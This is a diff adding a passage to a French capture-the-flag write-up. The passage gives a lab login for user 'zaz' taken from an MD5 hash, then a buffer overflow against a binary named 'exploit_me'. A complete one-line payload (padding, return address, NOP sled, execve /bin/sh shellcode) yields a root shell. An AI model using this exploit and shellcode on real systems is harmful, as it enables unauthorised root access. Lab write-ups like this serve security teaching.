@@ -283,3 +283,14 @@ En lançant ce dernier, une fenetre graphique s'ouvre et on peut voir le mot "sl
 A la fin du fichier "turtle" il y a une phrase "Can you digest the message? :)" qui fait reference au hash MD-5 (message digest) ;) ce qui nous donne :
 zaz : 646da671ca01bb5d84dbb5fb2238dc8e
 
+
+Une fois connecté avec zaz, on peut voir un fichier binaire "exploit_me", ce que nous allons nous empresser de faire ;)
+Apres tests et analyses on peut voir que "exploit_me" utilise un buffer fixe que nous allons remplir a fond. Ensuite on indique une adresse memoire (aleatoire.
+Et pour finir, une commande shellcode qui execute /bin/sh en tant que root:
+
+  ----------------------------------------------------------------------------------------
+./exploit_me $(python -c "print 'A'*140 + '\xac\xf4\xff\xbf' + '\x90'*500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'")
+  ----------------------------------------------------------------------------------------
+ TADAAAAAM ! IAMROOT
+
+
